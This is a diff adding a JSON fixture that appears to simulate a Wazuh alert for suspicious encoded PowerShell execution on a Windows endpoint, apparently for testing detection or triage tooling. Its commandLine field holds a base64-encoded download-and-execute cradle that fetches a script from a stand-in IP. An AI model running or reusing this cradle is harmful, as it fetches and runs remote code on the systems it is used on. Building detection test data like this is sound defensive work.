@@ -1,0 +1,60 @@
+{
+    "id": "wazuh-powershell-001",
+    "source": "wazuh",
+    "timestamp": "2026-06-10T12:00:00Z",
+    "payload": {
+      "id": "wazuh-powershell-001",
+      "timestamp": "2026-06-10T12:00:00Z",
+      "agent": {
+        "id": "001",
+        "name": "endpoint-01",
+        "ip": "10.0.1.42",
+        "os": {
+          "name": "Windows 11"
+        }
+      },
+      "manager": {
+        "name": "wazuh-manager-01"
+      },
+      "rule": {
+        "id": "92001",
+        "level": 12,
+        "description": "Suspicious PowerShell encoded command execution",
+        "groups": [
+          "windows",
+          "powershell",
+          "execution"
+        ],
+        "mitre": {
+          "id": [
+            "T1059.001"
+          ],
+          "tactic": [
+            "Execution"
+          ],
+          "technique": [
+            "PowerShell"
+          ]
+        }
+      },
+      "data": {
+        "win": {
+          "system": {
+            "providerName": "Microsoft-Windows-Security-Auditing",
+            "eventID": "4688",
+            "computer": "endpoint-01"
+          },
+          "eventdata": {
+            "subjectUserName": "alice",
+            "targetUserName": "alice",
+            "newProcessName": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "parentProcessName": "C:\\Windows\\explorer.exe",
+            "commandLine": "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAgAC4AMgA1AC8AYQAvAHMAdABhAGcAZQAuAHAAcwAxACcAKQA="
+          }
+        },
+        "srcip": "10.0.1.42",
+        "dstip": "198.51.100.25"
+      },
+      "full_log": "Windows process creation event: encoded PowerShell launched by alice on endpoint-01"
+    }
+  }
